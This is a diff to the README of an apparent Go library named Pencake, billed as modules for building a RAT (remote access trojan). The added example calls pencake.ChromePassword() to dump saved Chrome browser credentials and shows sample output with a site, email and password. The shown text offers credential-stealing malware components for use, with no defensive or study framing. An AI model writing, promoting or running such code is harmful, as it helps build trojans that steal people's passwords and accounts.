@@ -1,6 +1,26 @@
 # Pencake
 Modules you need for building a rat!
 
+### Example
+Getting all your chrome passwords
+```go
+package main
+
+import (
+	"fmt"
+	"pencake"
+)
+
+func main()  {
+	fmt.Println(pencake.ChromePassword())
+}
+
+/*
+Ouput:
+[{https://sso.stupid.edu shou@stupid.edu password} ...]
+*/
+```
+
 ### Getting Started
 
 ```bash
